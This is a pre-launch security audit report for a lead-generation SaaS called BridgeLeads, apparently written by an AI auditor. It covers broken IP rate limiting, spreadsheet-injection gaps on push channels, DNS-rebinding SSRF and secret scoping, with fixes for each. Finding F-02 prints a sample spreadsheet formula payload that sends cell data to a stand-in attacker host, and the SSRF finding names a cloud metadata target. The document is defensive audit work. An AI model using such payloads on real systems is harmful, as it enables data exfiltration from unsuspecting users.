# BridgeLeads — Pre-Launch Security Audit (PHASE 1: AUDIT ONLY)

**Date:** 2026-09-16
**Commit audited:** `60f1b00` (tip of `origin/main`)
**Worktree:** `C:/Users/Windows/bl-wt-secaudit` — branch `chore/security-audit-2026-09-16`
**Method:** static audit (8 parallel specialist agents) + live non-destructive production probing +
an isolated test-rig run + an independent Codex cross-review.
**No production changes. No credential rotation. No destructive testing.**

Detail files: `audit-tenant.md`, `audit-auth.md`, `audit-deploy.md`, `audit-ssrf.md`,
`audit-export.md`, `audit-secrets.md`, `audit-frontend.md` (+ `audit-billing.md` if delivered).

---

## 1. EXECUTIVE SECURITY SUMMARY

**BridgeLeads is materially more secure than a typical pre-launch SaaS.** That is a measured
claim, not a compliment: 69 of 69 tenant-scoped routes enforce ownership with *both* an explicit
`user_id` predicate *and* an RLS-bound session; the RLS cutover actually shipped; Stripe webhook
signatures verify; CORS rejects hostile origins; secrets are clean in tree *and* history; and 209
security regression tests pass.

**No P0 was found.** No cross-tenant read path, no authentication bypass, no exposed production
secret, no payment bypass.

The real risk is concentrated in **one infrastructure misconfiguration with a wide blast radius**
(F-01) and **one architectural asymmetry** (F-02): sanitization is applied at *file-export* time
rather than at the data boundary, so every *push* channel (dialer, outbound webhook) ships
unsanitized county text.

**The most important caveat in this report:** three security-critical behaviours are controlled by
**feature flags whose code defaults are `False`**. Production overrides them, but *this repository
cannot prove that*. Codex, reviewing the repo alone, read all three defaults as production state
and consequently reported a conditional P0. Confirming those three env values is the single
highest-value action available and is item #1 of the remediation plan.

| Severity | Count |
|---|---|
| P0 | **0** |
| P1 | 4 |
| P2 | 11 |
| P3 | 13 |

**Corrections made during this audit** (recorded because they show where the evidence overturned a
first read): I nearly filed a false P1 on RLS from a stale code comment; Codex's conditional P0 and
P1 entitlement bypass both rested on reading feature-flag *defaults* as production values; I
accepted a Codex correction on middleware ordering that turned out to be wrong and have reinstated
my original finding; my claim that `once_per` mitigates email flooding was wrong for the
password-reset path; and a "2 failed tests" scare in the isolated rig proved to be a stale grant,
not a defect.

---

## 2. ARCHITECTURE / TRUST BOUNDARIES

| Layer | Actual (verified, not assumed) |
|---|---|
| Marketing + app | Next.js on **Vercel** — `bridgeleads.io` and `app.bridgeleads.io` are the **same deployment** (identical Content-Length + ETag) |
| API | FastAPI on **Railway**, fronted by **Cloudflare** — `api.bridgeleads.io` (`Server: cloudflare`, `CF-RAY`) |
| API auth | JWT bearer + API key (`src/api/auth.py`); admin = `require_admin` / `require_admin_mfa` |
| Vercel auth | Auth.js/NextAuth cookies present (`__Host-authjs.csrf-token`) — a **second session surface** carrying no business authority (see §10) |
| DB | Postgres/Supabase — RLS (47 role-targeted policies, FORCE on 23 tables) **plus** mandatory `user_id` filter |
| DB roles | api=`app`, worker/beat=`app`/`system`, migrate=`postgres` (cutover 2026-06-12) |
| Queue | Celery + Redis (Upstash) |
| Storage | Cloudflare R2. `API_BASE_URL` empty ⇒ delivery falls back to **raw 48h presigned URLs** (`settings.py:239-243`) |
| Billing / Enrich / Email | Stripe · Tracerfy · Resend |

**Trust boundaries:** browser→API (bearer, CORS-restricted); API→DB (RLS + filter); API→queue→worker
(worker re-derives tenant, does not trust payload); worker→county portal (**untrusted input**);
worker→customer webhook/dialer (**egress**, SSRF-guarded); Stripe→API (HMAC-verified).

---

## 3. P0 CRITICAL FINDINGS

**None.**

Explicitly checked and **not** found: cross-tenant read/write, authentication bypass, exposed
production secret, payment bypass, browser-held database credential, privilege escalation to admin.

> Codex reported a *conditional* P0 ("RLS is fail-open by default"). It is conditional on
> `RLS_ENFORCE` being unset in production. Evidence says it is set — see §7 F-07 and §12.

---

## 4. P1 HIGH FINDINGS

### F-01 [P1] Every IP-keyed rate limit is non-functional in production
**CONFIRMED VULNERABILITY** — proven live, root cause proven in code.

Production evidence: `/auth/forgot-password` (zone `auth` = 10/min per IP) returned **200 on all
14 requests**, and **200 on all 14** with a fixed `X-Forwarded-For`. 16 distinct accounts × 1 login
attempt each → all 401, no 429. 8 rapid registrations → all 200.

**ROOT CAUSE — CONFIRMED AGAINST PRODUCTION (2026-09-17), not inferred.**
A read of `audit_events.ip` via the owner role shows every recorded client IP is in
**`100.64.0.0/10`** — RFC 6598 CGNAT shared space, Railway's internal mesh — **rotating across 23
addresses** (`100.64.0.2` … `100.64.0.23`).

`100.64.0.0/10` is **absent from `_TRUSTED_PROXY_NETWORKS`** (`rate_limit.py:54-60`, which covers
only `127.0.0.0/8`, `::1/128`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`). So
`_is_trusted_proxy()` returns **False**, the XFF branch at `rate_limit.py:101` is never entered, and
`client_ip()` falls through to `return direct_ip` — a **rotating infrastructure address**. Every
request mints a fresh `rl:auth:100.64.0.<n>` bucket, so the 10/min counter never reaches 2.

**Neither reviewer's model was right, though sec-auth's *mechanism* was:** the peer is untrusted and
the XFF branch is skipped (sec-auth), but because the peer is CGNAT — not a public Cloudflare
address (sec-deploy). `railway variables` confirms **`FORWARDED_ALLOW_IPS` is set on neither
service**, so uvicorn's `ProxyHeadersMiddleware` (default trust: `127.0.0.1`) also rejects
`100.64.0.x` — which is why `scope["scheme"]` stays `"http"` and **HSTS is never emitted**
(`security.py:511-512`). **One missing CIDR explains both symptoms.**

**Regression window identified.** The same table holds `127.0.0.1` with 153 hits, **last seen
2026-09-05**. When the peer was loopback it *was* trusted, the XFF branch *was* entered, and the
limiter worked. Railway moved the mesh to CGNAT and the limiter **died silently around 2026-09-05**.

**Fix is now small and concrete:**
1. Add `100.64.0.0/10` (and `fc00::/7` for the IPv6 equivalent) to `_TRUSTED_PROXY_NETWORKS`.
2. Set uvicorn `--proxy-headers --forwarded-allow-ips='100.64.0.0/10'` in `start.sh:97` — restores
   HSTS *and* `scope["client"]`.
3. Set `TRUSTED_PROXY_HOPS=2` — with Cloudflare→Railway the chain arriving is
   `<client>, <cf-egress>`, so `parts[-1]` is still the rotating edge and `parts[-2]` is the real
   client. **Verify the hop count empirically before trusting it.**
4. **Precondition:** make Cloudflare the sole ingress (Tunnel / Authenticated Origin Pulls). Without
   that, anything reaching Railway directly controls the whole XFF chain and `parts[-2]` is forgeable.

Affected: `login`, `register`, `forgot-password`, `reset-password`, MFA setup/enable/disable,
`refresh`, and **webhook signature-spray throttling** (`webhooks.py:164,180`; `billing.py:1710`).
**Unaffected:** every call passing `identifier=current_user.id`, and MFA verify / break-glass
(keyed `mfa-verify:{user_id}`). The `once_per()` email-bomb guard keys on **email**, not IP, and
also survives.

**Severity adjudication.** `sec-deploy` rated this **P0**; Codex and I say **P1**. I am holding
**P1**: the per-*account* brute-force lockout demonstrably still works in production (5 failures →
429, `Retry-After: 28`, and a spoofed XFF does **not** reset it), so this is a defence-in-depth
collapse, not an authentication bypass. It does not meet the P0 bar of "immediate exploitable
issue with severe impact".

**Not an attacker-controlled bypass.** Because the XFF branch is never entered, injected
`X-Forwarded-For` values are ignored. The I1 hardening at `rate_limit.py:78-97` is doing its job.
This is a **fidelity collapse, not a spoofing hole** — which matters, because the naive fix
reintroduces the spoofing hole.

**Fix.** Make Cloudflare the sole ingress (Tunnel / Authenticated Origin Pulls), then key on
`CF-Connecting-IP`. **Never widen `_TRUSTED_PROXY_NETWORKS` and never use `--forwarded-allow-ips=*`**
— that reintroduces the exact spoofing hole `rate_limit.py:78-97` was written to close. Codex and
both agents independently converged on this.

### F-01b [P1] The escalating account lockout never fires — F-01 killed its premise
**CONFIRMED VULNERABILITY.** This is the finding that makes F-01 bite, and it was found only
because the auth agent traced the *consequences* of F-01 rather than stopping at the limiter.

The 15-minute escalating lockout (`auth_hardening.py:475-483,491`) was explicitly premised on the
per-IP ladder that F-01 disabled. With the ladder dead, **4 guesses per 15 minutes never locks an
account — ever.**

What survives is only the short per-account cooldown I measured live: 5 failures → 429 →
`Retry-After: 28`. So the "account lockout" is a **~28-second speed bump, not a lockout**: an
attacker can sustain roughly 10 guesses/minute (~15,000/day) against a single named account
indefinitely, from any number of IPs, with no escalation and no permanent lock.

This **sharpens F-01** materially. I characterized the account lockout as an intact compensating
control when adjudicating F-01 down from P0; it is weaker than that. I am still holding **P1
rather than P0** — 15k guesses/day against bcrypt(12) with a strong password policy is not an
authentication *bypass* — but the two findings must be fixed together, and F-01b is the reason
the fix is urgent rather than merely correct.

*Residual forensics (does not block the fix):* two models predict the observation equally well —
peer is public (XFF branch skipped) vs peer is private (XFF branch taken, `parts[-1]` is the
rotating CF edge). My fixed-XFF test does **not** discriminate between them. The fix is identical
either way. Cheapest discriminator: log `request.client.host` once and ASN-lookup it.

### F-02 [P1] Push channels bypass CSV sanitization entirely
**CONFIRMED VULNERABILITY.** Found independently by **three** reviewers (sec-export, sec-ssrf, Codex).

Every **file** export is sanitized. Every **push** payload is not — zero occurrences of the
sanitizer across all five outbound modules: `scheduler_helpers/dialer.py:210-222`,
`webhook_delivery.py:171-184`, `dialer_outbox.py:170-179`,
`dialer_connectors/phoneburner.py:81-101`, `generic_webhook.py`. Ingest truncates but does not
sanitize (`tasks.py:956`).

**Attack path.** A county record is filed with an owner name of
`=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")`. It is scraped, stored, and pushed verbatim to
the customer's PhoneBurner/Zapier/CRM. The customer exports contacts to Excel — the normal
workflow — and the formula executes in *their* origin. The same row downloaded as CSV from
BridgeLeads is safe.

**Severity adjudication.** Codex argued P2 (it executes in the customer's downstream context, not
BridgeLeads' tenant) but conceded it "becomes P1 for integrations that automatically import into
executable spreadsheet contexts". **PhoneBurner is exactly such an integration**, so I am holding
**P1** for the dialer path and P2 for the generic-webhook path.

**Fix.** Route both payload builders through `build_lead_export_row`, or sanitize at ingest. The
root fix is to move sanitization from *export time* to the *data boundary* — one chokepoint
instead of five call sites.

### F-03 [P1] SSRF guard resolves DNS twice and never pins the validated IP (DNS rebinding)
**CONFIRMED VULNERABILITY.** Flagged by sec-ssrf (P1) **and** Codex ("remaining concern is DNS
check/connect TOCTOU"). Per the cross-check doctrine — both reviewers flagged it, take the higher
severity — **P1**.

Validation resolves at `security.py:155`; the connection resolves again at
`webhook_delivery.py:291`. A hostile DNS record with a short TTL can answer public on the first
lookup and `169.254.169.254` (or RFC1918) on the second.

**Mitigating, and it matters:** this is **blind** SSRF — the response body is never surfaced to the
user (zero `AsyncResult` refs in `src/`; redaction at `webhook_delivery.py:242-245`). Redirects are
**not followed** by default and where followed **every hop is re-validated**
(`safe_http.py:113,170`; `allow_redirects=False` on 100% of calls). All five IPv6/metadata ranges
are blocked (`::1`, `fc00::/7`, `fe80::/10`, `::ffff:127.0.0.1`, `169.254.169.254`).

**Fix.** Resolve once, validate the resolved IP, then **connect to that pinned IP** with the
hostname carried in SNI/Host.

---

## 5. P2 MEDIUM FINDINGS

| ID | Finding | Evidence |
|---|---|---|
| F-04 | **Password spraying unthrottled** — consequence of F-01. Per-account lockout is by design no defence against 1-attempt-per-account. | live: 16 accounts, all 401 |
| F-05 | **Unauthenticated email flooding — worse than I first wrote.** `/auth/forgot-password` has **no per-address `once_per` guard at all**, unlike both sibling flows, so it is an unthrottled email bomb to **arbitrary third-party addresses** (F-01 removed the IP limit). Registration is the milder case: `EMAIL_VERIFICATION_ENABLED` is on in prod, so 8 rapid signups made `pending_registrations` rows and **no tokens** — cost/reputation, not account creation. **My earlier claim that `once_per` mitigated this was wrong for the reset path.** | live: 28 reqs → all 200; `auth_hardening`/`password.py` |
| F-06 | **No DMARC** (`_dmarc.bridgeleads.io` NXDOMAIN) while the product emails password-reset links. DKIM + SPF exist on the `send.` subdomain, so legitimate mail authenticates; nothing tells receivers to reject spoofed mail. | Cloudflare authoritative DNS |
| F-07 | **Chromium runs `--no-sandbox` while rendering attacker-controlled county HTML.** A renderer exploit escapes directly into the worker container. | `base_scraper.py:193-207` |
| F-08 | **No response-size cap on non-streaming fetches** — decompression bomb / endless stream from a hostile source. | `safe_http.py:141-144` |
| F-09 | **The most expensive endpoint is unthrottled.** `/download` on a `NullPool` async engine takes a fresh Postgres connection per request. | `session.py:54`; `audit-deploy.md` F4 |
| F-10 | **Rate-limit fallback can be flushed wholesale.** `_fallback_hits.clear()` fires above 10,000 keys — an attacker mints 10k keys to wipe the Redis-outage fallback. | `rate_limit.py:126-127` |
| F-11 | **Stale signed Stripe event can overwrite newer entitlement state.** `customer.subscription.updated` falls back to the event body when live retrieval fails. | `billing.py:2080-2110` (Codex) |
| F-12 | **Tracerfy spend is unbounded.** Dispatch is worker-only, idempotent and tenant-scoped, but **the only ceiling is the prepaid provider balance returning 402**. Confirmed independently by Codex and sec-billing. ⚠️ **This fails your stated launch criterion #5** ("Tracerfy cannot be abused to create uncontrolled costs") — it can, up to the balance. | `skip_trace_dispatcher.py:231-268` |
| F-27 | **The access-log token redaction filter protects almost nothing.** `main.py:114-129` matches `?token=` only — not path segments, not `record.msg` — and is attached solely to `uvicorn.access`. Combined with F-22 (Tracerfy secret in the URL path) and the 48h download URL reaching worker logs + Redis (`webhook_delivery.py:242-245` redacts only one payload shape), credentials do reach logs. | `main.py:114-129`; `audit-export.md` F-3/F-4/F-9 |
| F-13 | **`BLIND_INDEX_KEY` has no production fail-closed guard** (unlike `FIELD_ENCRYPTION_KEY`, which refuses boot). | `audit-secrets.md` F-2 |
| F-14 | **CONFIRMED live via `gh` 2026-09-17.** `DATABASE_URL_SYNC` (the **production** DSN) and `RAILWAY_TOKEN_PRODUCTION` are **repo-level** secrets, so any workflow job — including the PR-triggered `test` job — can read them. Both the `production` and the stray duplicate `bridgeleads-production / production` environments have `protection_rules: []` and `deployment_branch_policy: null`. **Why this one is sharper here than the generic advice:** having the production DSN readable from the *test* job is the exact precondition for both prior production wipes. The `tests/_db_safety.py` guard blocks the known path, but the credential should not be in that context at all. *Mitigating:* repo is private and workflows use `pull_request`, not `pull_request_target`. | `gh api repos/.../actions/secrets`, `.../environments` |

---

## 6. P3 LOW FINDINGS

- **F-15** No HSTS on `api.bridgeleads.io` (same root cause as F-01). Partly mitigated: the apex
  HSTS carries `includeSubDomains`, covering browsers that hit the apex first — but not API-key,
  server, or mobile clients.
- **F-16** Unhandled-500 responses bypass CORS **and** security headers. **I reversed myself twice
  here, and the final answer is that my original claim was correct.** Codex argued the handler runs
  inside `ExceptionMiddleware`, and I accepted that. `sec-deploy` then verified against Starlette's
  actual `build_middleware_stack()`: a handler registered for the `Exception` key becomes
  `ServerErrorMiddleware`'s `error_handler`, and `ServerErrorMiddleware` is installed **outermost**,
  above `user_middleware`, writing via raw `send`. So the `{detail, ref}` 500 carries neither CORS
  nor security headers, and the browser cannot read the `ref`. **Codex was wrong; I was wrong to
  accept the correction without checking the framework source.** Severity stays P3.
- **F-17** `exports.bridgeleads.io` referenced at `.env.example:29` but **NXDOMAIN**.
- **F-18** **Stale security comments assert the opposite of production reality** —
  `session.py:386-392` claims "the current prod role HAS BYPASSRLS"; the `check_rls_role_status`
  docstring says enforcement gates on `ENVIRONMENT == "production"` while the code gates on
  `settings.RLS_ENFORCE` (`session.py:398`). This is not cosmetic: it cost this audit real time,
  it led Codex to a conditional-P0, and it invites a future engineer to drop a `WHERE user_id`
  filter as pointless. **Delete it.**
- **F-19** No MX on `bridgeleads.io` — mail to `security@`/`privacy@` bounces, so there is **no
  channel to receive a vulnerability report** and DSAR/legal mail vanishes. (Codex argued P3 rather
  than P2 — accepted; it is operational, not a direct vulnerability. Extends the known
  `bridgeleads.com` finding to the production `.io` domain.)
- **F-20** No SPF on the apex (`v=spf1 -all` would close apex-From spoofing).
- **F-21** RLS isolation tests can fail — or pass — for the wrong reason.
  `test_rls_isolation.py:56-77` grants to a **cluster-wide, persistent** role only at creation
  time, so it drifts as migrations add tables. "Permission denied" and "RLS filtered it" are not
  the same thing. Re-grant every run.
- **F-22** Tracerfy webhook accepts its secret as a **URL path segment**
  (`/webhooks/tracerfy/{provided_secret}`), and `main.py:115` redacts only `token=` *query* params
  — so the secret can reach access logs. *(Auth itself is correct: no-secret and wrong-secret both
  → 401, verified live.)*
- **F-23** Log redaction misses several credential families (`audit-secrets.md` F-6).
- **F-24** `.env.check` holds a Vercel OIDC token; backup/DB/scratch files not gitignored;
  real Supabase project ref in a tracked doc; unused standing production deploy token.
- **F-25** `fc00::/7` missing from the trusted-proxy set (latent — *not* the cause of F-01; that
  hypothesis was raised and **retracted** on live evidence).
- **F-26** Stripe return URLs: split handling, one path unvalidated (`audit-frontend.md` F-06).

---

## 7. ORIGINAL 30-ITEM MATRIX

| # | Item | Status | Evidence |
|---|---|---|---|
| 1 | Client-side secret exposure | **CONFIRMED SECURE** | exactly **one** `NEXT_PUBLIC_*` var; no secret literals |
| 2 | Git history secrets | **CONFIRMED SECURE** | tree clean, history clean, **rotation needed: nothing** (scope documented) |
| 3 | DB credential architecture | **CONFIRMED SECURE** | no browser-held DB credential; `*.supabase.co` in CSP is a **dead grant** |
| 4 | Row-level / tenant security | **CONFIRMED SECURE** ¹ | 69/69 routes: `user_id` filter **and** RLS session; empirically verified |
| 5 | Sensitive data protection | **PARTIAL** | field encryption fails closed; `BLIND_INDEX_KEY` does not (F-13) |
| 6 | Server-side authentication | **CONFIRMED SECURE** | all protected endpoints → 401 unauthenticated (live) |
| 7 | BOLA / IDOR | **CONFIRMED SECURE** | download route binds `Job.id` **and** `Job.user_id` (`jobs.py:1179-1213`) |
| 8 | Mass assignment | **CONFIRMED SECURE** | `extra="forbid"` on request models; `is_admin`/`plan` are response-only |
| 9 | Session security | **CONFIRMED SECURE** | bearer tokens; see §10 |
| 10 | Password security | **CONFIRMED SECURE** | pyca/bcrypt direct, `gensalt(12)`; passlib deliberately removed |
| 11 | Rate limiting | **CONFIRMED VULNERABILITY** | **F-01** |
| 12 | Billing caps / provider alerts | **NEEDS MANUAL PROVIDER VERIFICATION** | §29 |
| 13 | Bot protection | **PARTIAL** | `CAPTCHA_ENABLED=False` default; F-05 |
| 14 | Injection | **CONFIRMED SECURE** | no raw SQL from scraped text; dynamic ORDER BY allowlisted by type |
| 15 | Server-side input validation | **CONFIRMED SECURE** | malformed email → 422 before any auth work (live) |
| 16 | XSS | **CONFIRMED SECURE** | one sink, **unreachable**; email rendering HTML-escaped |
| 17 | File uploads | **NOT APPLICABLE** | no user upload surface |
| 18 | Excessive data exposure | **CONFIRMED SECURE** | no password hashes / tokens / provider internals in responses |
| 19 | Stripe webhook signatures | **CONFIRMED SECURE** | forged → 400, missing → 422 (**live**); 300s tolerance + mig-095 ledger **read before dispatch, not merely written after** (`billing.py:1746-1757`) + durable `first_paid_at` gate |
| 20 | Server-authoritative prices | **CONFIRMED SECURE** | `_PRICE_TO_PLAN` allowlist (`billing.py:368-376, 1028`); client sends only a `price_id`. Live Stripe prices independently reconciled against `PLAN_CATALOG` on 2026-09-08 |
| 21 | AI / prompt injection | **NOT APPLICABLE** | no customer-facing LLM feature |
| 22 | AI usage caps | **NOT APPLICABLE** | — |
| 23 | HTTPS | **CONFIRMED SECURE** | both hosts 308→HTTPS (live) |
| 24 | Security headers | **PARTIAL** | API headers strong; **HSTS missing** (F-15) |
| 25 | Production info exposure | **CONFIRMED SECURE** | `/docs`, `/redoc`, `/openapi.json` → **404** (live) |
| 26 | Error handling | **CONFIRMED SECURE** | `{detail, ref}`, no stack trace (`main.py:102-108`) |
| 27 | Dependency security | **PARTIAL** | see `audit-deploy.md`; deliberate pins (stripe ≤11.x, redis <6.5) must not be bumped blindly |
| 28 | Logging / monitoring | **PARTIAL** | global redaction installed; gaps F-22/F-23 |
| 29 | Backups / restore | **NEEDS MANUAL PROVIDER VERIFICATION** | §29 |
| 30 | MFA / admin infra | **NEEDS MANUAL PROVIDER VERIFICATION** | §29 |

¹ Conditional on `RLS_ENFORCE=true` in the Railway environment — see §12.

---

## 8. BRIDGELEADS-SPECIFIC MATRIX (31-50)

| # | Item | Status |
|---|---|---|
| 31 | CSRF | **NOT APPLICABLE** to the API (bearer, not cookie). Auth.js surface: §10 |
| 32 | CORS | **CONFIRMED SECURE** — attacker/`null`/suffix origins get no ACAO; evil preflight → 400 (live) |
| 33 | SSRF | **CONFIRMED VULNERABILITY** — F-03 (blind, rebinding) |
| 34 | Webhook destination security | **PARTIAL** — guarded at send time; F-03 + no size cap (F-08) |
| 35 | Open redirects | **PARTIAL** — login/logout safe; Stripe return split (F-26) |
| 36 | Stripe return flow | **CONFIRMED SECURE** — entitlement from webhook/subscription state, not query params |
| 37 | Privilege escalation | **CONFIRMED SECURE** — `require_admin` (404 for non-admins) + `require_admin_mfa` (JWT only, **not** API key) |
| 38 | Plan / entitlement bypass | **CONFIRMED SECURE** — gates enforced at the **auth layer** (`auth.py:305`), so JWT *and* API-key callers are covered equally; `ENTITLEMENT_ENFORCEMENT=true` confirmed in prod by a recorded `railway variables` read. FE `lib/entitlements.ts` also **fails closed** (unknown plan → starter; unknown record type → false) |
| 39 | Quota bypass | **CONFIRMED SECURE** — single-statement `SELECT … FOR UPDATE` + `LEAST(:want, GREATEST(0, eff_limit-base))` (`tasks.py:1647-1687`); API preflight advisory only |
| 40 | Background job authorization | **CONFIRMED SECURE** — worker re-derives tenant, does not trust payload |
| 41 | Job cancellation | **CONFIRMED SECURE** — tenant-bound |
| 42 | Real-time stream authorization | **CONFIRMED SECURE** — ownership + reconnect re-auth; leases keyed by user id (`sse_leases.py:52-82`) |
| 43 | Cache isolation | **CONFIRMED SECURE** — skip-trace cache keys include `user_id`; AI nav cache holds no lead data |
| 44 | Export authorization | **CONFIRMED SECURE** — job/batch exports bind object id to authenticated user |
| 45 | Integration secret storage | **PARTIAL** — F-22 |
| 46 | Account enumeration | **CONFIRMED SECURE** — reset returns 200 for unknown (live); register constant-time parity (`registration.py:260`) |
| 47 | Email security | **PARTIAL** — DKIM+SPF good; **no DMARC** (F-06), no MX (F-19) |
| 48 | Admin action auditability | **CONFIRMED SECURE** — `audit_log` + `test_audit_events.py` |
| 49 | CSV / spreadsheet injection | **CONFIRMED VULNERABILITY** — F-02 (push paths only) |
| 50 | Public-record ingestion trust | **PARTIAL** — no SQL/XSS path; F-02 + F-07 + F-08 |

---

## 9-11. TENANT ISOLATION / AUTHENTICATION / AUTHORIZATION

**Tenant isolation — the headline result.** All **69** tenant-scoped routes enforce ownership with
**both** an explicit `user_id` predicate **and** an RLS-bound session (`get_rls_db`). **Zero**
RLS-only routes. **Zero** filter-only routes. The four weaknesses found are worker-side and none
are request-reachable. Codex independently reached the same conclusion.

**Empirically verified**, not just read: on an isolated database with a real `NOBYPASSRLS` role,
`test_rls_blocks_cross_tenant_read_on_results` and `..._on_delivered_records` both **pass** —
tenant A cannot read tenant B's rows.

**Your two flagged hypotheses, resolved — neither is a security issue:**
- **"Already delivered" on a new Starter account — NOT a cross-tenant leak.** Delivery history is
  tenant-keyed *at the schema level*: `UniqueConstraint("user_id", "dedup_hash")`
  (`models.py:989`) with `ON CONFLICT (user_id, dedup_hash)` at `tasks.py:1070`. Intended
  behaviour; the visible symptom was a mis-attributed link, fixed by migration 089.
- **1,001/50 — NOT a tenant-scoping defect and not a counting bug.** It is a **consumed Pro trial
  downgraded to Starter with the counter deliberately preserved**. Both COUNT(*)s feeding it pin
  `user_id` + `job_id`. Nothing crosses a tenant boundary.

**Worst residual (worker-side, not request-reachable):** `src/workers/tasks.py:464-466` loads a
config without a `user_id` predicate, and `jobs` has no composite FK to constrain it. Not
exploitable from the API today; worth closing so it cannot become exploitable later.

**Frontend admin gate — resolved, and the backend is strong.** `sec-frontend` escalated
`admin/connectors/page.tsx:49` (gates the add-connector form on `plan === "agency"` rather than
`is_admin`, and it POSTs an arbitrary `base_url`) as P1-if-the-backend-doesn't-enforce. **The
backend does enforce**, more strictly than anything else in the codebase:
`scrapers.py:933-936` puts `dependencies=[Depends(require_admin_mfa)]` on `POST /connectors` —
admin **plus** enrolled MFA **plus** a fresh MFA-backed JWT, explicitly **not** an API key, with
non-admins getting 404. The docstring names the reason: *"it registers a new SSRF-allowlisted
scrape target."* **Resolved to P3 UI inconsistency**, not P1.

**Authentication.** JWT bearer + API key. Password hashing is pyca/bcrypt direct (passlib
deliberately removed). Account lockout works in production and resists XFF spoofing. Reset links
are built from `src/config/frontend_routes.py` off `settings` — **`request.base_url`,
`request.url_for`, and `Host`-header reads have zero matches across all of `src/`**, so there is
**no host-header poisoning** vector.

**Authorization.** Two-tier admin gating: `require_admin` returns **404** (hiding endpoint
existence) and `require_admin_mfa` additionally demands a JWT session — **an API key cannot perform
sensitive admin operations**. Inline `is_admin` checks were centralized away.

---

## 12. SECRETS REPORT

**Working tree: clean. Git history: clean. Rotation required: nothing.** The negative result is
auditable — `audit-secrets.md` documents every pattern searched and the history range covered.
No production secret is present in any frontend artifact.

**The three feature flags (the most important open item in this report).**

| Flag | Code default | Evidence for the production value | Confidence |
|---|---|---|---|
| `EMAIL_VERIFICATION_ENABLED` | `False` (`settings.py:225`) | **Live behavioural proof:** prod `/auth/register` returns **200**, not the legacy path's **201** (`registration.py:222-224` vs `:312`) | **High — proven** |
| `RLS_ENFORCE` | `False` (`settings.py:237`) | **SETTLED 2026-09-17 — `railway variables -s api\|worker` returns `RLS_ENFORCE=true` on BOTH services.** | **Closed — CONFIRMED SECURE** |
| `ENTITLEMENT_ENFORCEMENT` | `False` (`settings.py:194`) | **SETTLED — documented.** `docs/ENTITLEMENT-AUDIT-2026-09-08.md:12-14` records an actual `railway variables -s api\|worker` read showing `=true` on **both** services, and states in terms: *"The code default of False is not the production value."* | **Closed — INFO** |

**Codex read all three defaults as production state** and derived a conditional P0 plus a P1
entitlement bypass from them. One of the three is now **settled against Codex by a recorded
production read**; the other two remain High-confidence-but-indirect. So remediation item #1
shrinks to **two** values: `RLS_ENFORCE` and (for completeness) `API_BASE_URL`/`TRUSTED_PROXY_HOPS`.

Worth noting: that same 2026-09-08 audit document also used Codex as its second reviewer, and it
too had to correct Codex on a code-default-vs-production-value confusion. **This is a repeatable
blind spot of repo-only review, not a one-off** — and it is a good argument for keeping the
production flag values recorded in a doc that reviewers will find.

---

## 13-28. SUBSYSTEM SUMMARIES

- **Database** — RLS enforced (conditional on §12), FORCE on 23 tables, 47 role-targeted policies,
  `DATABASE_URL` role has `DELETE=False` on every table.
- **API** — headers strong (CSP `default-src 'none'`, COOP, CORP, nosniff, XFO DENY) except HSTS;
  CORS correct; docs disabled; errors carry a reference id, never a trace.
- **Scraper / worker / queue** — workers re-derive tenant from the job row. County HTML treated as
  untrusted for SQL (no interpolation) but **not** for spreadsheet formulas (F-02), renderer
  sandboxing (F-07), or payload size (F-08).
- **Tracerfy** — authorization, entitlement, dedup and idempotency all present; **spend ceiling
  absent** (F-12).
- **Stripe** — signature verification + durable event ledger (mig 095) verified; stale-event
  fallback is the one gap (F-11).
- **Quota / entitlement** — worker reservation authoritative and atomic; API preflight advisory.
- **Exports** — file paths sanitized and tenant-bound; push paths unsanitized (F-02). If
  `API_BASE_URL` is empty, delivery emails carry **48h presigned R2 URLs** — confirm it is set.
- **Live streams** — tenant-scoped including reconnect.
- **Frontend** — one `NEXT_PUBLIC_*` var; no browser-held Supabase credential; one unreachable XSS
  sink; CSP `unsafe-inline`/`unsafe-eval` is defence-in-depth weakness (P3), not an exploitable
  finding, because no reachable sink was found.

---

## 29. MANUAL PROVIDER CHECKLIST (cannot be answered from code)

**Do these yourself; share no credentials with me.**

1. **Railway env** — dump `RLS_ENFORCE`, `ENTITLEMENT_ENFORCEMENT`, `EMAIL_VERIFICATION_ENABLED`,
   `API_BASE_URL`, `TRUSTED_PROXY_HOPS`. *(Highest value item in this report.)*
2. **Supabase** — PITR enabled? retention? **restore actually tested** into a scratch project?
   A backup is not proven until a restore is.
3. **Billing caps** — Railway / Supabase / Resend / Tracerfy / Cloudflare: which support **hard
   caps** vs **alerts only**? Do not assume a cap exists without provider documentation.
4. **Stripe** — confirm webhook endpoint secret rotation policy and that livemode is enforced.
5. **DNS** — add DMARC (`p=none` with `rua=` first, then tighten), apex SPF `v=spf1 -all`, and MX
   (or a forwarder) so `security@bridgeleads.io` receives mail.
6. **MFA + hardware keys** on: GitHub, Railway, Supabase, Vercel, Cloudflare, domain registrar,
   Stripe, Resend, Tracerfy, business email, password manager. Prefer passkeys/security keys.
7. **GitHub** — add protection rules to the `production` environment; scope the production DB
   credential to that environment rather than the repo; remove the unused standing deploy token.

---

## 30. TEST COVERAGE

**209 passed · 10 skipped · 0 genuine failures**, run on an isolated DB (`bridgeleads_secaudit_test`,
Redis db 12) so no concurrent session was disturbed.

Covered: RLS isolation + role policies + GUC reapply, collection scope, quota
reservation/accounting, skip-trace over-quota, entitlement matrix, jobs entitlement guard, API-key
plan guard, CSV injection + sanitize, webhook SSRF, brute-force lockout, break-glass ×2, log
redaction, config secret redaction, token amr.

**Gaps worth adding** (from your requested regression list): cross-tenant live-stream subscription;
CSV formula payload **on the dialer/webhook push path** (F-02 has no test — which is why it
shipped); SSRF **DNS-rebinding** case (the existing test does not cover re-resolution); duplicate
Stripe webhook replay; `X-Forwarded-For` spoofing regression **with a proxy in front**.

---

## 31. CODEX FINDINGS — INDEPENDENT VERIFICATION

| Codex claim | My verification | Verdict |
|---|---|---|
| RLS fail-open by default → conditional P0 | Default is `False`, but journal + fail-closed boot + liveness say prod is `true` | **Rejected as live risk; accepted as unproven** → §12 |
| Starter bypasses entitlements (`ENTITLEMENT_ENFORCEMENT=False`) | **Settled by a recorded `railway variables` read**: `=true` on api *and* worker (`docs/ENTITLEMENT-AUDIT-2026-09-08.md:12-14`) | **Rejected — documented** (code-default misread) |
| Registration yields real accounts + tokens immediately | Prod returns **200**, not 201 → verified flow → pending row, **no tokens** | **Rejected** (code-default misread) |
